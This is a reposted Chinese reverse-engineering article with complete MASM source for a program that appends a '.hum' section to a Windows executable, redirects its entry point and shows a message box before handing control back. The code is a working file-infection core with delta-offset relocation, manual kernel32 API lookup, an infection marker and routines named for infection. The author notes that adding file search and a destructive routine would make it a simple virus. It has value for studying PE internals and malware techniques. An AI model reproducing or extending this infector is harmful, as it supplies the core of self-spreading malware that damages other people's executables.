
# PE 文件添加节显示启动信息

> 原文：[`www.pediy.com/kssd/pediy05/pediy50297.htm`](https://www.pediy.com/kssd/pediy05/pediy50297.htm)

闲来写了个修改 PE 的小程序，主要是演示和实践 PE 操作和重定位的概念，实在没事情的时候，可以看看，你将会看到 PE 文件实际上很简单！当然，首先得作好被我的垃圾代码扫了雅兴的准备。这里利用的是我前面介绍的方法的手动查找 API 的方法。这个东西修改 PE 并在最后加上一节，节名 `.hum`，被附加程序启动前会显示一个 `MsgBox`，以显示一些信息，你可以用来给自己破的软件来一个所谓的版权信息（我最痛恨的就是....这个！烦），当然也可以执行其他一些操作，实际上，再加上文件搜索功能和破坏例程，这就将是一个最简单的病毒....

这个例子没有优化，也没有安排好结构，有兴趣的凑合着看吧，另外还有一些冗余，没有兴趣整理了。

编译要加入 `/section:.text,RWE` 选项。默认操作是对同目录下的 `sc.exe`（heh..,my starcraft）。

记住，PE 文件实际上是很简单的，只要你耐心看下去。

注：虽然用了 `Virus` 字样，但不是病毒...

```asm
.586

.model flat, stdcall

option casemap :none ; case sensitive

include c:\\hd\\hd.h

include c:\\hd\\mac.h

;;--------------

GetApiA         proto      :DWORD, :DWORD

;;--------------

.CODE

VirusLen        =  vEnd-vBegin                ;Virus 长度

vBegin:

;-----------------------------------------

include s\_api.asm               ;查找需要的 api 地址

;-----------------------------------------

desfile         db "sc.exe",0

fsize          dd ?

hfile          dd ?

hMap           dd ?

pMem           dd ?

;-----------------------------------------

pe\_Header      dd ?

sec\_align      dd ?

file\_align     dd ?

newEip         dd ?

oldEip         dd ?

inc\_size       dd ?

oldEnd         dd ?

;-----------------------------------------

sMessageBoxA                                     db "MessageBoxA",0

aMessageBoxA         dd 0

;;临时变量...

sztit             db "By Hume,2002",0

szMsg0             db "Hey,Hope U enjoy it!",0

CopyRight         db "The SoftWare WAS OFFERRED by Hume\[AfO\]",0dh,0ah

                  db "        Thx for using it!",0dh,0ah

                  db "Contact: Humewen@21cn.com",0dh,0ah

                  db "        humeasm.yeah.net",0dh,0ah

                  db "The add Code SiZe:(heX)"

val             dd 0,0,0,0

;;-----------------------------------------

\_\_Start:

    call    \_gd

\_gd:

    pop     ebp                         ;得到 delta 地址

    sub     ebp,offset \_gd                 ;因为在其他程序中基址可能不是默认的所以需要重定位

    mov     dword ptr \[ebp+appBase\],ebp   ;呵呵仔细想想

    mov     eax,\[esp\]                  ;返回地址

    xor     edx,edx

getK32Base:

    dec     eax                         ;逐字节比较验证

    mov     dx,word  ptr \[eax+IMAGE\_DOS\_HEADER.e\_lfanew\] ;就是 ecx+3ch

    test    dx,0f000h                  ;Dos Header+stub 不可能太大,超过 4096byte

    jnz     getK32Base                 ;加速检验

    cmp     eax,dword ptr \[eax+edx+IMAGE\_NT\_HEADERS.OptionalHeader.ImageBase\]

    jnz     getK32Base                 ;看 Image\_Base 值是否等于 ecx 即模块起始值,

    mov     \[ebp+k32Base\],eax        ;如果是,就认为找到 kernel32 的 Base 值

    lea     edi,\[ebp+aGetModuleHandle\]

    lea     esi,\[ebp+lpApiAddrs\]

lop\_get:

    lodsd

    cmp     eax,0

    jz      End\_Get

    add     eax,ebp

    push    eax

    push    dword ptr \[ebp+k32Base\]

    call    GetApiA

    stosd

    jmp     lop\_get                   ;获得 api 地址,参见 s\_api 文件

End\_Get:

    call    my\_infect

    include dislen.asm

    ;-----------------------------------------

CouldNotInfect:

\_\_where:

    xor     eax,eax          ;判断是否是已经附加,标志'dark'

    push    eax

    call    \[ebp+aGetModuleHandle\]

    mov     esi,eax

    add     esi,\[esi+3ch\] ;->esi->程序本身的 Pe\_header

    cmp     dword ptr \[esi+8\],'dark'

    je      jmp\_oep

    jmp     \_\_xit                ;退出启动程序

jmp\_oep:

    add     eax,\[ebp+oldEip\]

    jmp     eax                  ;跳到宿主程序的入口点

my\_infect:                    ;感染部分,文件读写操作,Pe 文件修改参见 modipe.asm 文件

    xor     eax,eax

    push    eax

    push    eax

    push    OPEN\_EXISTING

    push    eax

    push    eax

    push    GENERIC\_READ+GENERIC\_WRITE

    lea     eax,\[ebp+desfile\]

    push    eax

    call    \[ebp+aCreateFile\]             ;打开目标文件

    inc     eax

    je      \_\_Err

    dec     eax

    mov     \[ebp+hfile\],eax

    push    eax

    sub     ebx,ebx

    push    ebx

    push    eax                  ;得到文件大小

    call    \[ebp+aGetFileSize\]

    inc     eax

    je      \_\_sclosefile

    dec     eax

    mov     \[ebp+fsize\],eax

    xchg    eax,ecx

    add     ecx,1000h            ;文件大小增加...4096

    pop     eax

    xor     ebx,ebx              ;创建映射文件

    push    ebx

    push    ecx      ;文件大小等于原大小+Vsize

    push    ebx

    push    PAGE\_READWRITE

    push    ebx

    push    eax

    call    \[ebp+aCreateFileMapping\]

    test    eax,eax

    je      \_\_sclosefile

    mov     \[ebp+hMap\],eax         ;创建成功否?

    xor     ebx,ebx

    push    ebx

    push    ebx

    push    ebx

    push    FILE\_MAP\_WRITE

    push    eax

    call    \[ebp+aMapViewOfFile\]

    test    eax,eax

    je      \_\_sclosemap           ; 映射文件,是否成功?

    mov     \[ebp+pMem\],eax

    ;--------------------------------------------

    ; the following is modifying part,add new section

    ;--------------------------------------------

    include modipe.asm

\_\_sunview:

    push    \[ebp+pMem\]

    call    \[ebp+aUnmapViewOfFile\]

\_\_sclosemap:

    push    \[ebp+hMap\]

    call    \[ebp+aCloseHandle\]

\_\_sclosefile:

    push    \[ebp+hfile\]

    call    \[ebp+aCloseHandle\]

\_\_Err::

    ret

;-----------------------------------------

\_\_xit:

    push    0

    call    \[ebp+aExitProcess\]

vEnd:

;-----------------------------------------

END    \_\_Start

;;==============================================

;;s\_api.asm

;;手动查找 api 部分

K32\_api\_retrieve       proc    Base:DWORD ,sApi:DWORD

    push    edx            ;保存 edx

    xor     eax,eax       ;此时 esi=sApi

Next\_Api:                 ;edi=AddressOfNames

    mov     esi,sApi

    xor     edx,edx

    dec     edx

Match\_Api\_name:

    movzx  ebx,byte  ptr \[esi\]

    inc    esi

    cmp    ebx,0

    je     foundit

    inc    edx

    push   eax

    mov    eax,\[edi+eax\*4\]       ;AddressOfNames 的指针,递增

    add    eax,Base                ;注意是 RVA,一定要加 Base 值

    cmp    bl,byte  ptr \[eax+edx\] ;逐字符比较

    pop    eax

    je     Match\_Api\_name          ;继续搜寻

    inc    eax                ;不匹配,下一个 api

    loop   Next\_Api

no\_exist:

    pop    edx            ;若全部搜完,即未存在

    xor    eax,eax

    ret

foundit:

    pop    edx            ;edx=AddressOfNameOrdinals

                           ;\*2 得到 AddressOfNameOrdinals 的指针

    movzx  eax,word  ptr \[edx+eax\*2\] ;eax 返回指向 AddressOfFunctions 的指针

    ret

K32\_api\_retrieve       endp

;-----------------------------------------

GetApiA       proc    Base:DWORD,sApi:DWORD

    local    ADDRofFun:DWORD

    pushad

    mov    esi,Base

    mov    eax,esi

    mov    ebx,eax

    mov    ecx,eax

    mov    edx,eax

    mov    edi,eax                    ;all is Base!
```



### 汇编代码片段：API 检索逻辑

```
add     ecx,[ecx+3ch]                 ;现在 esi=off PE_HEADER
add     esi,[ecx+78h]                 ;得到 esi=IMAGE_EXPORT_DIRECTORY 入口
add     eax,[esi+1ch]                 ;eax=AddressOfFunctions 的地址
mov     ADDRofFun,eax
mov     ecx,[esi+18h]                ;ecx=NumberOfNames
add     edx,[esi+24h]                ;edx=AddressOfNameOrdinals
add     edi,[esi+20h]                ;esi=AddressOfNames
invoke  K32_api_retrieve,Base,sApi
mov     ebx,ADDRofFun
mov     eax,[ebx+eax*4]              ;要*4 才得到偏移
add     eax,Base                     ;加上 Base!
mov     [esp+7*4],eax               ;eax 返回 api 地址
popad
ret

GetApiA       endp

u32                 db "User32.dll",0
k32                 db "Kernel32.dll",0

appBase           dd ?
k32Base           dd ?

;-----------------------------------------apis needed

lpApiAddrs        label near
                dd      offset sGetModuleHandle
                dd      offset sGetProcAddress
                dd      offset sLoadLibrary
                dd      offset sCreateFile
                dd      offset sCreateFileMapping
                dd      offset sMapViewOfFile
                dd      offset sUnmapViewOfFile
                dd      offset sCloseHandle
                dd      offset sGetFileSize
                dd      offset sSetEndOfFile
                dd      offset sSetFilePointer
                dd      offset sExitProcess
                dd      0,0

sGetModuleHandle      db "GetModuleHandleA",0
sGetProcAddress       db "GetProcAddress",0
sLoadLibrary          db "LoadLibraryA",0
sCreateFile           db "CreateFileA",0
sCreateFileMapping    db "CreateFileMappingA",0
sMapViewOfFile        db "MapViewOfFile",0
sUnmapViewOfFile      db "UnmapViewOfFile",0
sCloseHandle          db "CloseHandle",0
sGetFileSize          db "GetFileSize",0
sSetFilePointer       db "SetFilePointer",0
sSetEndOfFile         db "SetEndOfFile",0
sExitProcess          db "ExitProcess",0

aGetModuleHandle              dd 0
aGetProcAddress               dd 0
aLoadLibrary                  dd 0
aCreateFile                   dd 0
aCreateFileMapping            dd 0
aMapViewOfFile                dd 0
aUnmapViewOfFile              dd 0
aCloseHandle                  dd 0
aGetFileSize                  dd 0
aSetFilePointer               dd 0
aSetEndOfFile                 dd 0
aExitProcess                  dd 0

;-----------------------------------------
```

### modipe.asm：修改 PE 头以实现传染

```
;;========================modipe.asm=================
;修改 pe,添加节,实现传染功能
      xchg    eax,esi
      cmp     word  ptr [esi],'ZM'
      jne     CouldNotInfect
      add     esi,[esi+3ch]  ;指向 PE_HEADER
      cmp     word  ptr [esi],'EP'
      jne     CouldNotInfect ;是否是 PE,否则不感染
      cmp     dword ptr [esi+8],'dark'
      je      CouldNotInfect
      mov     [ebp+pe_Header],esi ;保存 pe_Header 指针
      mov     ecx,[esi+74h]  ;得到 directory 的数目
      imul    ecx,ecx,8
      lea     eax,[ecx+esi+78h]  ;data directory  eax->节表起始地址
      movzx   ecx,word  ptr [esi+6h]  ;节数目
      imul    ecx,ecx,28h       ;得到所有节表的大小
      add     eax,ecx           ;节结尾...
      xchg    eax,esi           ;eax->Pe_header,esi->最后节开始偏移

;;********************************************************************
;;添加如下结构:
;;name .hum
;;VirtualSize==原 size+VirSize
;;VirtualAddress=
;;SizeOfRawData 对齐
;;PointerToRawData
;;PointerToRelocations dd 0
;;PointerToLinenumbers dd ?
;;NumberOfRelocations dw  ?
;;NumberOfLinenumbers dw  ?
;;Characteristics     dd ?
;;********************************************************************
      mov     dword ptr [esi],'muh.' ;节名.hum
      mov     dword ptr [esi+8],VirusLen ;实际大小
      ;计算 VirtualSize 和 V.addr
      mov     ebx,[eax+38h]         ;SectionAlignment
      mov     [ebp+sec_align],ebx
      mov     edi,[eax+3ch]         ;file align
      mov     [ebp+file_align],edi
      mov     ecx,[esi-40+0ch]      ;上一节的 V.addr
      mov     eax,[esi-40+8]        ;上一节的实际大小
      xor     edx,edx
      div     ebx                   ;除以节对齐
      test    edx,edx
      je      @@@1
      inc     eax
@@@1:
      mul     ebx                   ;对齐后的节大小
      add     eax,ecx               ;加上 V.addr 就是新节的起始 V.addr
      mov     [esi+0ch],eax         ;保存新 section 偏移 RVA
      add     eax,__Start-vBegin
      mov     [ebp+newEip],eax      ;计算新的 eip
      mov     dword ptr [esi+24h],0E0000020h  ;属性
      mov     eax,VirusLen          ;计算 SizeOfRawData 的大小
      cdq
      div     edi                   ;节的文件对齐
      je      @@@2
      inc     eax
@@@2:
      mul     edi
      mov     dword ptr [esi+10h],eax ;保存节对齐文件的大小
      mov     eax,[esi-40+14h]
      add     eax,[esi-40+10h]
      mov     [esi+14h],eax         ;PointerToRawData 更新
      mov     [ebp+oldEnd],eax      ;最后文件增加到...?
      mov     eax,[ebp+pe_Header]
      inc     word  ptr [eax+6h]    ;更新节数目
      mov     ebx,[eax+28h]         ;eip 指针偏移
      mov     [ebp+oldEip],ebx      ;保存老指针
      mov     ebx,[ebp+newEip]
      mov     [eax+28h],ebx         ;更新指针值
      ;comment $
      mov     ebx,[eax+50h]         ;更新 ImageSize
      add     ebx,VirusLen
      mov     ecx,[ebp+sec_align]
      xor     edx,edx
      xchg    eax,ebx       ;eax 和 ebx 交换...
      cdq
      div     ecx
      test    edx,edx
      je      @@@3
      inc     eax
@@@3:
      mul     ecx
      xchg    eax,ebx       ;还原  eax->pe_Header
      mov     [eax+50h],ebx         ;保更新后的 Image_Size 大小
      ;$
      mov     dword ptr [eax+8],'dark'
      cld                   ;写入
      mov     ecx,VirusLen
      mov     edi,[ebp+oldEnd]
      add     edi,[ebp+pMem]
      lea     esi,[ebp+vBegin]
      rep     movsb             ;写入文件,all is OK!
      xor     eax,eax
      sub     edi,[ebp+pMem]
      push    FILE_BEGIN
      push    eax
      push    edi
      push    [ebp+hfile]
      call    [ebp+aSetFilePointer]
      push    [ebp+hfile]
      call    [ebp+aSetEndOfFile]
```

### disLen.asm

```
;============================disLen.asm
    lea     eax,[ebp+u32]
      push    eax
      call    dword ptr [ebp+aLoadLibrary]
      test    eax,eax
      jnz     @g1
@g1:
      lea     EDX,[EBP+sMessageBoxA]
      push    edx
      push    eax
      mov     eax,dword ptr [ebp+aGetProcAddress]
      call    eax
      mov     [ebp+aMessageBoxA],eax
      ;-----------------------------------------
      mov     ebx,VirusLen
      mov     ecx,8
      cld
      lea     edi,[ebp+val]
L1:
      rol     ebx,4
      call    binToAscii
      loop    L1
      push    40h+1000h
      lea     eax,[ebp+sztit]
      push    eax
      lea     eax,[ebp+CopyRight]
      push    eax
      push    0
      call    [ebp+aMessageBoxA]
      jmp     __where
;-----------------------------------------
binToAscii    proc  near
      mov     eax,ebx
      and     eax,0fh
      add     al,30h
      cmp     al,39h
 jbe     @f
      add     al,7
 @@:
      stosb
      ret
binToAscii    endp
```



`;----------------------------over-----by hume   4dd466d0e1e0cc123afbe504da2462ca`
